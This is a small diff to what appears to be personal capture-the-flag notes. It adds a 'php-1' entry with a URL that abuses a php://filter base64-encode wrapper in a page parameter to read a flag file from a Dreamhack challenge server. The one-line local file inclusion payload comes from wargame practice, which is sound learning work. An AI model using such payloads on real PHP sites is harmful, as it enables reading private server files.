@@ -354,5 +354,7 @@ if __name__ == "__main__":
 ```
 ### session-basic
 - wtf /admin ???
+### php-1
+```http://host3.dreamhack.games:10501/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag```
 ### out of money
 - 
